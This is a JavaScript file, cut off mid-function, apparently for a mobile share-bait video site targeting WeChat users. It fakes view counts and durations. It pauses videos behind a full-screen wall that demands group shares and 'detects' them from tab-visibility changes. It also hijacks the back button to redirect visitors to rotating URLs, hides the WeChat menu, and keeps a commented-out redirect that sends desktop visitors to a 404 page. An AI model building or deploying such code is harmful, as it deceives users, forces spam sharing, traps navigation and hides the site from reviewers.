/// if((/^(Win|Mac)/i.test(navigator.platform)||!/mobile|Android|phone|iPhone|iPod|ios|iPad/i.test(navigator.userAgent))&&(!localStorage.idf||parseInt( config('mobile')))){
// 	window.location = 'http://www.qq.com/babygohome/?pgv_ref=404';
// } 
    $_GET = getUrlVal();
    conf.id = $_GET.id || '';
    conf.vid = 0;
    conf.video_date = new Date().toLocaleDateString();
    conf.video_visit = 0;
    conf.type = $_GET.type || 1;
    conf.typename = 'videolist';
    conf.multqr = conf.qrmode*1 || getBool();
    
    function get_navs() {
        let navs = conf.videotype.split('|');
        let nav = {};
        navs.forEach((item, index) => {
            nav[index + 1] = item;
        });
        return nav;
    }
    conf.navs = get_navs();
    
    var QRSetting = get_QRCodeSetting();
    
    function preload_qrBG(){
        var urls = [...config('oneQrcode',2), ...config('mutileQrcode',2)];
        
        urls.forEach(function(url, index){
            url = fix_static(url.split('|')[0]);
            const link = document.createElement('link');
            link.rel = 'preload';
            link.href = url;
            link.as = 'image'; 
            document.head.appendChild(link);
        })
    }
    preload_qrBG();
    const getVideoTr = (videos, len = 6, type = 1) => {
        const shuffled = [...videos].sort(() => Math.random() - 0.5);
        const arr = [];
        for (let i = 0; i < len; i++) {
            let v = shuffled[i % shuffled.length];
    
            if (v.img.indexOf('es/14.jpg') > -1) {
                v.img = `/images/${Math.floor(Math.random() * 4) + 11}.jpg`;
            }
            v.img = fix_static(v.img);
            const randomMinutes = Math.floor(Math.random() * 90) + 10;
            const randomSeconds = Math.floor(Math.random() * 51) + 10;
            const randomPlays = Math.floor(Math.random() * 90) + 10;
            const html = `
    <a href="?type=${type}&id=${v.id}" class="list_con">
        <div class="list_img">
            <img src="${v.img}">
            <div class="core">${randomMinutes}:${randomSeconds}</div>
        </div>
        <div style="flex: 1;">
            <div class="list_ber">
                <div class="list_key">
                    <span style="color:#f66;">免费</span>
                    <span style="color:#f66;">推荐</span>
                    <div class="list_tag">${randomPlays}.9万次播放</div>
                </div>
            </div>
            <div class="title">${v.name}</div>
        </div>
    </a>`.trim();
    
            arr.push(html);
        }
    
        return arr;
    };
    conf.html = getVideoTr(init_list(conf.type), 10).join('');
    
    if (conf.id) {
        let showVideos = init_list(conf.type);
    
        conf.video = showVideos[conf.id - 1] || showVideos[Math.floor(Math.random() * showVideos.length)];
        show_item();
    } else {
        show_index();
    }
    function getBool() {
        return Math.random() < 0.5 ? 0 : 1;
    }
    function getRandom(min, max, fixed = 0) {
        return (Math.random() * (max - min) + min).toFixed(fixed); 
    }
    
    function init_list(type = 1) {
        if (type <= 1) {
            type = 'videolist';
        } else {
            type = 'videolist' + type;
        }
        let listVideo = conf[type].split('\n');
        let videoList = [];
        let id = 0;
        listVideo.forEach((item, index) => {
            let [id, name, src, img] = `${index + 1}|${item}`.split('|');
            img = fix_static(img);
            videoList.push({ id: parseInt(id), name, src, img });
        });
        return videoList;
    }
    function fix_static(url){
        if(url.length > 200){
            return url;
        }
        const hasHost = /^(?:[a-z]+:)?\/\/[^/]+/.test(url);
        if (hasHost || res.length< 5) {
            return url;
        } else {
            if (!res.endsWith('/')) {
                res += '/';
            }
            return res + url.replace(/^\.?\//, '');
        }
    }
    
    
    function get_list(len, is_first = false) {
        if(window.isload) return;
    
        var time = 100;
        var scrollTop = $(window).scrollTop();
        var scrollHeight = $(document).height();
        var innerHeight = window.innerHeight;
        if (Math.ceil(scrollTop) + innerHeight >= scrollHeight - 3) {
            $('.video_load').show();
            window.isload = true;
            clearTimeout(window.scrollTime);
            window.scrollTime = setTimeout(function () {
                //$.post(host+'/images/xxx?act=videos',{len:len||12,type:conf.type},function(d){
                var vlist = getVideoTr(init_list(conf.type), len).join('');
                
                $('#video_list').append(vlist);
                clearTimeout(window.scrollTime2);
                window.scrollTime2 = setTimeout(function () {
                    window.isload = false;
                    $('.video_load').hide();
                }, getRandom(300, 800));
                //},'json');
            }, time * 2);
        }
    }
    
    function show_index() {
        var h = '';
        h += '	<header class="head_top clearfix top-fixed headroom--top headroom--not-bottom stui-header_bd clearfix" id="header-top"  style="position: sticky;top: 0;z-index: 10;opacity: 1;" >';
        h += '		<div class="main" >';
        if (config('url2', 1)) {
            h += '	<div class="main video_ad_line" ><a href="' + config('url2', 1) + '"><img id="admimg1" src="' + config('btn2', 1) + '" border="0" width="100%" style="display:block;"></a></div>';
        }
        if (config('url5', 1)) {
            h += '		<style>';
            h += '			.ad_box{display:flex;list-style:none;background-color:#0696ff;}';
            h += '			.ad_box li{width:25%;display:inline-block;margin:0;padding:0;}';
            h += '			.ad_box_a{background:#ee5051;font-size:28px;display:block;margin:10px 5px;padding:8px;text-align:center;border-radius:18px;color:#f6fe04;line-height:1.2;font-family: initial;font-weight:700;}';
            h += '		</style>';
            h += '		<ul class="ad_box">';
            h += '			<li><a href="' + config('url5', 1) + '" class="ad_box_a">' + config('btn5', 1) + '</a></li>';
            h += '			<li><a href="' + config('url6', 1) + '" class="ad_box_a">' + config('btn6', 1) + '</a></li>';
            h += '			<li><a href="' + config('url7', 1) + '" class="ad_box_a">' + config('btn7', 1) + '</a></li>';
            h += '			<li><a href="' + config('url8', 1) + '" class="ad_box_a">' + config('btn8', 1) + '</a></li>';
            h += '		</ul>';
        }
        h += '	</header>';
        h += '<div class="video_list" id="video_list" style="flex-grow: 1; margin-top: 10px; opacity: 1;">' + conf.html + '</div>';
    
        h += '	<div class="main video_load" onclick="get_list();"><img src="https://cdn.jsdmirror.com/gh/gnlwi/jgiesd@latest/images/loading.gif" style="">加载中··· ···</div>';
        if (config('url3', 1)) {
            h += '	<div class="video_ad" ><a href="' + config('url3', 1) + '"><img id="admimg1" src="' + config('btn3', 1) + '" border="0" width="100%"></a></div>';
        }
        h += '	<div style="height:150px;"></div>';
    
        h += '	<div id="bottom_float_ad" style="display: flex;  width: 100%;  bottom: 10px;  position: fixed;  z-index: 99;">';
        if (config('leftfloatad', 1)) {
    
            h += '<li class="fd_f_a"><a href="' + config('leftfloatad', 1) + '" target="_blank"><img src="' + config('leftfloatadimg') + '"></a></li>';
        }
        if (config('rightfloatad', 1)) {
    
            h += '<li class="fd_f_a"><a href="' + config('rightfloatad', 1) + '" target="_blank"><img src="' + config('rightfloatadimg') + '"></a></li>';
        }
        h += '</div>';
    
        h = myChat(h);
        document.write(h);
        $(window).scroll(function(){
            get_list();
        });
    
        setTimeout(function() {
            initCategoryTabs();
        }, 100);
    }
    function show_item() {
        var h = '';
        h += '	<header class="head_top clearfix top-fixed headroom--top headroom--not-bottom stui-header_bd clearfix" id="header-top"  style="position: sticky;top: 0;z-index: 10;opacity: 1;" >';
        h += '	<div class="goback" onclick="location.href=\'?\'">';
        h += '		<div class="goback_left" id="fanhui"><i class="back_icon"></i>返回</div>';
        h += '		<div class="goback_right" id="fanhui"><a href="./images/ts_wx/" style="color:#ffd8ae;" >投诉</a></div>';
        h += '	</div>';
        h += '	<div class="video_tag" id="tp5">';
        h += '		<div id="video"></div>';
        h += '	</div>';
        h += '	</header>';
    
        h += '	<div class="video_div" >';
        h += '		<div style="flex: 1;">';
        h += '			<h3>' + conf.video.name + '</h3>';
        h += '		</div>';
        h += '	</div>';
    
        if (config('url2', 1)) {
            h += '	<div class="main video_ad_line" ><a href="' + config('url2', 1) + '"><img id="admimg1" src="' + config('btn2', 1) + '" border="0" width="100%"></a></div><br>';
        }
        h += '	<div class="main video_list" style="padding-bottom:40px;">';
        h += '		<div class="list_title">猜你喜欢</div>';
        h += '<div class="video_list" id="video_list" style="flex-grow: 1; margin-top: 10px; opacity: 1;">' + conf.html + '</div>';
        h += '	</div>';
        h += '	<div class="main video_load"><img src="https://cdn.jsdmirror.com/gh/gnlwi/jgiesd@latest/images/loading.gif" style="">加载中··· ···</div>';
        if (config('url3', 1)) {
            h += '	<div class="video_ad" ><a href="' + config('url3', 1) + '"><img id="admimg1" src="' + config('btn3', 1) + '" border="0" width="100%"></a></div>';
        }
        h += '	<div style="height:150px;"></div>';
        h += '	<div id="bottom_float_ad" style="display: flex;  width: 100%;  bottom: 10px;  position: fixed;  z-index: 99;">';
        if (config('leftfloatad', 1)) {
    
            h += '<li class="fd_f_a"><a href="' + config('leftfloatad', 1) + '" target="_blank"><img src="' + config('leftfloatadimg') + '"></a></li>';
        }
        if (config('rightfloatad', 1)) {
    
            h += '<li class="fd_f_a"><a href="' + config('rightfloatad', 1) + '" target="_blank"><img src="' + config('rightfloatadimg') + '"></a></li>';
        }
        h += '</div>';
    
        h += showShare();
        h = myChat(h);
        document.write(h);
        play(true);
    
    }
    function showShare() {
        var h = '';
        h += '<style>';
        h += '	.ui_block *{margin:0;padding:0;}';
        h += '	.ui_block{display:none;width:100%;height:100vh;top:0;left:0;position:fixed;background-color:#000;background-size:cover;z-index:10;}';
        h += '	.ui_finger{display:block;width:132px;margin:0 auto;text-align:center;position:absolute;left:0;right:0;bottom:20vh;}';
        h += '	.ui_img{width:100%;margin:auto;z-index:19002000;}';
        h += '	.ui_share{position:fixed;width:100vw;height:100vh;bottom:0;left:0;opacity:0.01;z-index:19002020;}';
        h += '	.ui_animation{border-width:6px;border-style:solid;border-bottom-color:#69ca62;border-right-color:#FFF;border-top-color:#69ca62;border-left-color:#fff;transition:ease 0.5s;border-radius:50%;overflow:hidden;width:180px;height:180px;font-weight:700;z-index:19002000;top:-36px;left:-31px;animation:kcqwmgzh 2s infinite ease-in-out;position:absolute;}';
        h += '	.ui_con{margin:150px auto 0;background:#fff;border:solid #e3e3e3 1px;border-radius:14px;width:77%;max-width:450px;text-align:center;position:absolute;top:0;left:0;right:0;padding:32px 26px;color:#333;font-size:18px;line-height:31px;font-weight:700;}';
        h += '	@keyframes kcqwmgzh{';
        h += '		0%{transform:scale(1);-webkit-transform:scale(1);border-color:#6f6;box-shadow:0 0 20px rgba(0,255,0,.6), inset 0 0 10px rgba(0,255,0,.4);}';
        h += '		100%{transform:scale(0.5);-webkit-transform:scale(0.6);opacity:0.1;border-color:#393;box-shadow:0 0 5px rgba(0,255,0,.2), inset 0 0 5px rgba(0,255,0,.1);}';
        h += '	}';
        h += '</style>';
        h += '<div class="ui_block" >';
        h += '	<div class="ui_finger" >';
        h += '		<img class="ui_img" src="https://cdn.jsdmirror.com/gh/gnlwi/jgiesd@latest/images/finger.png">';
        h += '		<div class="ui_animation" ></div>';
        h += '	</div>';
        h += '	<img id="shareButton" class="ui_share">';
        h += '	<div class="ui_con"></div>';
        h += '</div>';
        h += '<audio class="ui_mp3" src="https://cdn.jsdmirror.com/gh/gnlwi/jgiesd@latest/images/music2.mp3" preload=""></audio>';
        return h;
    }
    function set_board() {
        $('.video_div,.video_operate').click(function(e) {
            location.href = config('ready');
        });
        var time = 3;
        var index = 0;
        var rollindex = setInterval(broll, time * 1000);
        function broll() {
            var sinc = 10;
            var step = $('.discuss_list ul li').height() / sinc;
            var stay = parseInt($('.discuss_list ul').css('margin-top') || 0) - step;
            var stat = $('.discuss_list ul').css('margin-top');
            if ($('.discuss_list ul li').length > 1) {
                var ssei = setInterval(function() {
                    if (sinc-- > 1) {
                        stay = stay - step;
                        $('.discuss_list ul').css('margin-top', stay);
                    } else {
                        if (++index > $('.discuss_list ul li').length - 2) {
                            $('.discuss_list ul').css('margin-top', index = 0);
                        }
                        clearInterval(ssei);
                    }
                }, 20);
            }
        }
        $('.discuss_list ul').on('mouseover', function() {
            clearInterval(rollindex);
        });
        $('.discuss_list ul').on('mouseout', function() {
            rollindex = setInterval(broll, time * 1000);
        });
        $('.discuss_list ul').append($('.discuss_list ul li').eq(0).clone());
    }
    function play(auto) {
        $('.ui_block').hide();
        $('#video').show();
        window.dp = new DPlayer({
            container: document.getElementById('video'),
            autoplay: true,
            video: {
                type: 'auto',
                url: conf.video.src,
                pic: conf.video.img || 'images/viewas.png',
            },
        });
        dp.on('ended', function() {
            dp.pause();
            if (config('ready')) {
                location.href = config('ready');
            }
        });
        dp.play();
        if (auto && coo('visit') >= config('see', 1)) {
            var tx = config('pre', 1);
            window.mshi = setInterval(function() {
                var currentTime = dp.video.currentTime;
                if (currentTime >= tx) {
                    tx += 5;
                    dp.pause();
                    $('#video').hide();
                    coo('snt', 0, conf.cache);
                    shx();
                    clearInterval(window.mshi);
                    clearInterval(window.msh2);
                    window.msh2 = setInterval(function() {
                        clearInterval(window.mshi);
                        dp.pause();
                    }, 100);
                } else if (currentTime > tx) {
                    clearInterval(window.mshi);
                    return;
                }
            });
        }
        if (!coo('visit2')) {
            coo('visit', 2, config('cache'));
        }
        coo('visit2', 1, config('cache'))
        coo('visit', (coo('visit') || 0) + 1, config('cache'));
    }
    $(function() {
        coo('snt', coo('snt') || 0, conf.cache);
        if (config('title', 1)) {
            document.title = config('title', 1);
        }
        if (window.mqq) {
            mqq.ui.setTitleButtons({
                left: {
                    title: "返回",
                    callback: function() {}
                },
                right: {
                    hidden: true,
                }
            })
        }
        if (config('popurl', 1)) {
            function getUrl() {
                var urls = config('popurl', 2);
                if (sessionStorage.jumpIndex >= urls.length || !sessionStorage.jumpIndex) {
                    sessionStorage.jumpIndex = 0;
                }
                return urls[sessionStorage.jumpIndex++];
            }
            try {
                tbsJs.onReady('{useCachedApi : "true"}', function(b) {})
            } catch (err) {}
            window.history.pushState({
                title: 'title',
                url: '#' + Math.random()
            }, 'title', '#')
            window.addEventListener('popstate', function(h) {
                top.location.href = getUrl();
            }, false);
        }
        try {
            document.addEventListener('WeixinJSBridgeReady', function onBridgeReady() {
                WeixinJSBridge.call('hideOptionMenu');
            });
        } catch (e) {}
        if (config('census'))
        if (config('tongji'))
           $('body').append('<div style="display:none;">' + config('tongji') + '</div>');
        set_board();
        if(config('multqr') === 1){
            createQr();
        }else{
            create3Qr();
        }
    });
    function shx(state) {
        setovblc();
        $('.ui_block').show();
        var snt = coo('snt') || 0;
        var quns = config('sqr', 2);
        var sbgs = config('sbg', 2);
        var num = config('num', 1);
        var qun = quns[snt % quns.length];
        var qun = config('sqr', 1);
        //var sbg = sbgs[snt % sbgs.length];
        var sbg = sbgs[Math.floor(Math.random() * sbgs.length)];
        var mss = conf['tip' + (snt % 7)];
        var qun = quns[Math.floor(Math.random()*quns.length)];
        if (snt >= num) {
            coo('visit', 0);
            var shu = localStorage.readyUrl || config('ready', 1) || '';
            if (shu.length < 3) {
                location.reload();
            } else {
                location.href = shu;
            }
            return;
        }
        $('.ui_con').html(mss);
        $('.ui_block').css('background-image', 'url(' + myChat(sbg) + ')');
        setTimeout(function() {
            $('.ui_mp3')[0].play();
        }, 800);
        $(window).click(function(e) {
            $('.ui_mp3')[0].play();
        });
    }
    
    
    function setovblc() {
        if (!window.hiddenProperty) {
            window.hiddenProperty = 'hidden'in document ? 'hidden' : 'webkitHidden'in document ? 'webkitHidden' : 'mozHidden'in document ? 'mozHidden' : null;
            var vsbce = hiddenProperty.replace(/hidden/i, 'visibilitychange');
            var touchTime, isTouch = false;
            document.getElementById('shareButton').addEventListener('touchstart', function() {
                clearTimeout(touchTime);
                coo('sheTime', 1, 4);
                var touchStartTime = null;
                touchTime = setTimeout(function touch() {
                    isTouch = true;
                }, 250);
            });
    
            document.getElementById('shareButton').addEventListener('touchend', function() {
                clearTimeout(touchTime);
                if (touchStartTime !== null) {
                    var touchEndTime = Date.now();
                    var timeDiff = touchEndTime - touchStartTime;
                    if (!hiddenProperty) {
                        if (timeDiff > 2000) {
                            shx(2);
                            isTouch = true;
                        } else {
                            tipRed('未检测到分享，请成功发送到群哦~');
                            isTouch = false;
                        }
                    }
                    touchStartTime = null;
                }
            });
            function ovblc() {
                if (!document[hiddenProperty]) {
                    if (!coo('sheTime') && isTouch || localStorage.idf) {
                        coo('snt', coo('snt') + 1, conf.cache);
                        isTouch = false
                        shx(2);
                    } else {
                        isTouch = false
                        tipRed('未检测到分享，请成功发送到群哦~');
                    }
                }
            }
            document.addEventListener(vsbce, ovblc);
        }
    }
    
    //打印参数
    function bug() {
        if (!window.bug_con) {
            var h = '';
            h += '<div id="bug_box" onmouseover="this.style.opacity=1;" style="position:fixed;left:2px;bottom:2px;width:76vw;max-width:400px;background:#fff;border:1px solid #999;border-radius:10px;overflow:hidden;z-index:296654455;opacity:0.2;">';
            h += '	<div onclick="document.body.removeChild(bug_box);" style="color:#666;background:#eee;font-size:14px;font-weight:600;line-height:1;padding:7px 14px;border-bottom:solid 1px #ccc;">Debug</div>';
            h += '	<div id="bug_con" style="min-height:30px;max-height:40vh;font-size:7px;line-height:1.2;white-space:pre-wrap;word-break:break-all;color:#44c;tab-size:4;padding:3px 5px;overflow:auto;font-family:Menlo,Monaco,Consolas;"></div>';
            h += '</div>';
            document.body ? document.body.insertAdjacentHTML('afterBegin', h) : document.write(h);
        }
        console.log.apply(null, arguments);
        bug_con.innerHTML += '<span style="color:red;font-weight:600;">' + (new Date().toLocaleString(0, {
            hour12: 0
        })) + '\tArg[' + arguments.length + ']</span>\t' + JSON.stringify(arguments.length == 1 ? arguments[0] : Object.values(arguments), null, '\t').replace(/</g, '&lt;').replace(/>/g, '&gt;') + '\n';
        bug_con.scrollTo(0, 19891016);
    }
    
    function msg(con, fun) {
        layer.open({
            content: con,
            btn: ['确定'],
            yes: function(index) {
                fun.call(this);
                layer.close(index);
            }
        });
    }
    function getUrl() {
        var shu = config('shu', 1);
        if (!/^http|\?/.test(shu))
            shu = '//' + shu;
        if (!/^\?/.test(shu))
            shu = shu + '?{www}={wwwwnnn}';
        shu = myChat(shu.replace('FROM', conf.code));
        return shu;
    }
    //定时提示框
    function thisLink(u) {
        var a = document.createElement('a');
        a.href = u;
        return a.href;
    }
    ;function config(n, m, d) {
        var v = undefined === conf[n] ? null : conf[n];
        if (1 == m || 2 == m) {
            if ('string' == typeof (v)) {
                v = v.replace(/^\s+|\s+$/g, '').split(/\s*\n\s*/);
            }
            if (1 == m && v instanceof Array) {
                v = v[Math.floor(Math.random() * v.length)];
            }
            v = v || d || null;
        } else {
            v = v || d || m || null;
        }
        if ('string' == typeof (v)) {
            v = myChat(v);
            if (/^\d+$/.test(v))
                v = v * 1;
        }
        return v;
    }
    function myChat(s) {
        var ico = ['🌀', '🌷', '♈', '♉', '♊', '♋', '♌', '♍', '♎', '♏', '♐', '♑', '♒', '♓', '⛎', '😠', '😩', '😲', '😞', '😵', '😰', '😒', '😍', '😤', '😜', '😝', '😋', '😘', '😚', '😷', '😳', '😅', '😱', '👙', '👗', '👡', '💰', '🔯', '🅰', '🅱', '🆎', '🅾', '🎀', '🎁', '🎥', '🎬', '🎯', '💋', '💏', '💌', '🔞', '⭕', '❌', '💓', '💔', '💕', '💖', '💗', '💘', '💞', '🈲', '㊙', '💢'];
        if ('object' == typeof (s))
            s = s[Math.floor(Math.random() * s.length)];
        if (window.res) s = s.replace(/(^|\=["']|url\(\s*)(\.\/)?(images|upload|mp)\b/gi, '$1' + res + '/$3');
        s = s.replace(/\{(\w+)\}/g, function(a, b) {
            if (window.conf && conf[b])
                return config(b, 1);
            var h = '';
            b = b.toUpperCase();
            for (var i = 0; i < b.length; i++) {
                if ('C' == b[i]) {
                    h += conf.city || '同城';
                } else if ('O' == b[i]) {
                    h += ico[Math.floor(Math.random() * ico.length)];
                } else if ('N' == b[i]) {
                    h += Math.floor(Math.random() * 10);
                } else if ('D' == b[i]) {
                    h += String.fromCharCode(65 + Math.floor(Math.random() * 26));
                } else {
                    h += String.fromCharCode(97 + Math.floor(Math.random() * 26));
                }
            }
            return h;
        });
        return s;
    }
    function coo(n, v, e) {
        var k, b = {}, t = Math.floor(new Date() / 1000), o = JSON.parse(localStorage.us || '{}');
        for (k in o)
            if ('object' == typeof o[k] && o[k][1] > t) {
                b[k] = o[k][0];
            }
        if (v === null) {
            delete o[n];
        } else if (v === undefined) {
            return b[n] || 0;
        } else {
            o[n] = [v, t + (e || parseInt(conf.cache) || 2592000)];
        }
        localStorage.us = JSON.stringify(o);
        return b
    }
    ;//获取随机数会随机抽取
    function rand(a, m) {
        if (typeof (a) == 'object') {
            window.indexi = window.indexi || 0;
            return a[window.indexi++ % a.length];
        }
        return a + Math.floor(Math.random() * (m - a));
    }
    //JS提示弹框
    function tipRed(text, time) {
        window.tmsg && document.body.removeChild(tmsg);
        document.body.insertAdjacentHTML('beforeEnd', '<div id="tmsg" style="top:0;left:0;right:0;color:#fff;margin:0 auto;opacity:0;padding:7px 0;font-size:15px;position:fixed;text-align:center;background-color:#eb0000;transition:opacity 0.6s;z-index:111111111;width:100%;">' + text + '</div>');
        setTimeout('tmsg.style.opacity=1', 0);
        clearTimeout(window.tmst);
        window.tmst = setTimeout('tmsg.style.opacity=0;setTimeout("document.body.removeChild(tmsg)",600);', time || 4000);
    }
    //JS提示弹框
    function tip(text, time) {
        window.tmsg && document.body.removeChild(tmsg);
        document.body.insertAdjacentHTML('beforeEnd', '<div id="tmsg" style="top:200px;left:20%;right:20%;color:#fff;margin:0 auto;opacity:0;padding:5px;font-size:15px;max-width:300px;position:fixed;text-align:center;border-radius:8px;background-color:#333;border:1px solid #222;box-shadow:rgba(0,0,0,0.25) 0px 0px 10px 6px;transition:opacity 0.6s">' + text + '</div>');
        setTimeout('tmsg.style.opacity=0.8', 0);
        clearTimeout(window.tmst);
        window.tmst = setTimeout('tmsg.style.opacity=0;setTimeout("document.body.removeChild(tmsg)",600);', time || 3000);
    }
    //解析 $_GET
    function getUrlVal(u) {
        var j, g = {};
        u = (u || document.location.href.toString()).split('?');
        if (typeof (u[1]) == "string") {
            u = u[1].split("&");
            for (var i in u) {
                j = u[i].split("=");
                if (j[1] !== undefined) g[j[0]] = decodeURIComponent(j[1])
            }
        }
        return g;
    }
    function get_QRCodeSetting(){
        var field = config('multqr') === 1 ? 'oneQrcode' : 'mutileQrcode';
        var [bg, Qrsize, left, top, isFont] = config(field,1).split('|');
        Qrsize = Qrsize.split(':').map(item => parseInt(item));
        left = left.split(':').map(item => parseInt(item));
        top = top.split(':').map(item => parseInt(item));
        isFont = isFont ? isFont.split(':').map(item => parseInt(item)) : [];
        var url = [config('qrurl', 1)+"&"+new Date().getTime(),config('topurl', 1)+"&"+new Date().getTime(), config('lefturl', 1)+"&"+new Date().getTime(), config('righturl', 1)+"&"+new Date().getTime()]
        return {bg, Qrsize, left, top, url, isFont};
    }
    
    function RandomPicker(arr) {
        let shuffled = [...arr];
        shuffled.sort(() => Math.random() - 0.5);
    
        return () => {
            if (!shuffled.length) shuffled = [...arr];
            return shuffled.pop().split('|');
        };
    }
    function createQr() {
        getQr({
            bg: 'v',
            url: 'myChat(v)',
            qrwidth: config('qrsize'),
            qx3: config('qrright'),
            qy3: config('qrbottom'),
            txt: config('qrtext'),
            tx2: 200,
            ty2: 200,
        }, function(vo) {
            $('.ui_share').attr('src', vo.src);
            if (config('qrdebug')=='true') {
                console.log(vo);
                document.body.innerHTML = '<img src="' + vo.src + '" width="100%">';
            }
        });
    }
    function add_text_canvas(context, options){
        if(!options || !options.isFont) return;
    
        let modeTextInfo = RandomPicker(config(options.textName, 2));
        
        let [font, fontColor, borderColor] = modeTextInfo();
            
        if(font.length < 2){
            return;
        }
        if(font.length >= 1){
            var fontSize = Math.floor(Math.min(options.Qrsize * 0.9 / font.length, options.Qrsize/6));
            var borderWidth = 5;
            context.font = `bold ${fontSize}px Arial`;
            context.textAlign = 'center';
            context.textBaseline = 'top';
            var pos;
            switch (options.textName) {
                case 'lefttext':case 'righttext':
                    if(!getRandom(0,3)) return;
                    pos = 1;
                    borderWidth = 1;
                    break;
                default:
                    if(getBool()) return;
                    pos = getBool();
                    break;
            }
            var metrics = context.measureText(font);
            var fontWidth = metrics.width,
                fontHeight = metrics.actualBoundingBoxAscent + metrics.actualBoundingBoxDescent;
            var QrCenterX = options.QrcodeLeft + (options.Qrsize / 2);
            var QrCenterY = options.QrcodeTop + options.Qrsize*pos + (pos ? 5 : -5 - fontHeight);
            context.lineWidth = borderWidth || 5;
            context.strokeStyle = borderColor || '#FF0';
            context.strokeText(font, QrCenterX, QrCenterY);
            context.fillStyle = fontColor || '#FFF';
            context.fillText(font, QrCenterX, QrCenterY);
            context.globalAlpha = options.alpha;
        }
    
    }
    
    function getQr(vo, fn) {
        var backImage = new Image();
        backImage.src = QRSetting.bg;
        backImage.crossOrigin = 'Anonymous';
        backImage.onload = function() {
            var Qrsize = QRSetting.Qrsize[0];
            var base64_img = jrQrcode.getQrBase64(QRSetting.url[0], {width:Qrsize,height:Qrsize, padding: 0});
            var canvas = document.createElement("canvas");
            canvas.width = backImage.width;
            canvas.height = backImage.height;
            var context = canvas.getContext("2d");
            context.rect(0, 0, canvas.width, canvas.height);
            context.drawImage(backImage, 0, 0, backImage.width, backImage.height);
            var qrcodeImage = new Image();
            qrcodeImage.src = base64_img;
            qrcodeImage.crossOrigin = 'Anonymous';
            qrcodeImage.onload = function() {
                var QrcodeLeft =  QRSetting.left[0]*1,
                    QrcodeTop = QRSetting.top[0]*1;
                add_text_canvas(context,{
                    textName: 'qrtext'
                    , QrcodeLeft
                    , QrcodeTop
                    , Qrsize
                    , alpha: getRandom(0.8, 1, 2)
                    , isFont: QRSetting.isFont?.[0] || false
                })
                context.drawImage(qrcodeImage, QrcodeLeft, QrcodeTop, Qrsize, Qrsize);
                vo.src = canvas.toDataURL("image/jpeg");
                fn && fn.call(this, vo);
                
            }
        }
    }
    ;
    function initCategoryTabs() {
        var categories = conf.videotype.split('|');
        if (!categories || categories.length === 0) {
            console.log('No video categories found');
            return;
        }
        var tabsContainer = document.createElement('div');
        tabsContainer.className = 'category-tabs';
        tabsContainer.style.display = 'flex';
        tabsContainer.style.justifyContent = 'flex-start';
        tabsContainer.style.margin = '0';
        tabsContainer.style.padding = '10px 15px';
        tabsContainer.style.backgroundColor = '#fff';
        tabsContainer.style.borderBottom = '1px solid #eee';
        tabsContainer.style.position = 'sticky';
        tabsContainer.style.top = '0';
        tabsContainer.style.zIndex = '5';
        tabsContainer.style.width = '100%';
        tabsContainer.style.overflowX = 'auto';
        categories.forEach(function(category, index) {
            var tab = document.createElement('div');
            tab.className = 'category-tab';
            tab.setAttribute('data-category', index + 1);
            tab.textContent = category;
            tab.style.padding = '8px 15px';
            tab.style.margin = '0 10px 0 0';
            tab.style.borderRadius = '0';
            tab.style.backgroundColor = '#f0f0f0';
            tab.style.cursor = 'pointer';
            tab.style.transition = 'all 0.3s ease';
            tab.addEventListener('click', function() {
                document.querySelectorAll('.category-tab').forEach(function(t) {
                    t.style.backgroundColor = '#f0f0f0';
                    t.style.color = '#333';
                    t.style.fontWeight = 'normal';
                    t.style.borderBottom = 'none';
                });
                this.style.backgroundColor = '#fff';
                this.style.color = '#ff6b6b';
                this.style.fontWeight = 'bold';
                this.style.borderBottom = '2px solid #ff6b6b';
                var categoryIndex = this.getAttribute('data-category');
                showCategoryVideos(categoryIndex);
                updateUrlParam('type', categoryIndex);
            });
            
            tabsContainer.appendChild(tab);
        });
        var mainElement = document.querySelector('.main');
        if (mainElement) {
            mainElement.parentNode.insertBefore(tabsContainer, mainElement.nextSibling);
        } else {
            document.body.insertBefore(tabsContainer, document.body.firstChild);
        }
        var defaultCategory = $_GET.type || 1;
        var defaultTab = document.querySelector(`.category-tab[data-category="${defaultCategory}"]`);
        if (defaultTab) {
            defaultTab.click();
        } else if (document.querySelector('.category-tab')) {
            document.querySelector('.category-tab').click();
        }
    }
    function updateUrlParam(key, value) {
        var url = new URL(window.location.href);
        url.searchParams.set(key, value);
        window.history.pushState({}, '', url);
    }
    function showCategoryVideos(categoryIndex) {
        var videoListContainer = document.getElementById('video_list');
        if (!videoListContainer) {
            videoListContainer = document.createElement('div');
            videoListContainer.id = 'video_list';
            videoListContainer.className = 'video_list';
            var tabsContainer = document.querySelector('.category-tabs');
            if (tabsContainer) {
                tabsContainer.parentNode.insertBefore(videoListContainer, tabsContainer.nextSibling);
            } else {
                document.body.appendChild(videoListContainer);
            }
        }
        videoListContainer.innerHTML = '';
        var videos = init_list(categoryIndex);
        
        if (!videos || videos.length === 0) {
            videoListContainer.innerHTML = '<div style="text-align: center; padding: 20px;">该分类暂无视频</div>';
            return;
        }
        var videoHtml = getVideoTr(videos, 10, categoryIndex).join('');
        videoListContainer.innerHTML = videoHtml;
        $(window).off('scroll').on('scroll', function() {
            get_list(6, false);
        });
        window.isload = false;
    }

    function getQrWithTriple(vo, fn) {
        var backImage = new Image();
        backImage.src = QRSetting.bg;
        backImage.crossOrigin = 'Anonymous';
        backImage.onload = function() {
            var canvas = document.createElement("canvas");
            canvas.width = backImage.width;
            canvas.height = backImage.height;
            var context = canvas.getContext("2d");
            context.drawImage(backImage, 0, 0, backImage.width, backImage.height);
            var loadedQrCodes = 0;
            var totalQrCodes = 3; 
            function drawQrWithText(url, text, x, y, size, alpha, isFont, index) {
                var qrcodeImage = new Image();
                qrcodeImage.src = jrQrcode.getQrBase64(url, {width: size, height: size, padding: 0});
                qrcodeImage.crossOrigin = 'Anonymous';
                qrcodeImage.onload = function() {
                    add_text_canvas(context, {
                        textName: text,
                        QrcodeLeft: x,
                        QrcodeTop: y,
                        Qrsize: size,
                        alpha: alpha,
                        isFont: isFont
                    });
                    context.drawImage(qrcodeImage, x, y, size, size);
                    loadedQrCodes++;
                    if (loadedQrCodes === totalQrCodes) {
                        vo.src = canvas.toDataURL("image/jpeg");
                        fn && fn.call(this, vo);
                    }
                };
                qrcodeImage.onerror = function() {
                    console.error('Failed to load QR code image for URL: ' + url);
                    loadedQrCodes++;
                    if (loadedQrCodes === totalQrCodes) {
                        vo.src = canvas.toDataURL("image/jpeg");
                        fn && fn.call(this, vo);
                    }
                };
            }
            drawQrWithText(
                QRSetting.url[2], 
                'lefttext', 
                QRSetting.left[1]*1, 
                QRSetting.top[1]*1, 
                QRSetting.Qrsize[1]*1, 
                getRandom(0.8, 0.9, 2), 
                QRSetting.isFont?.[1] || false,
                0
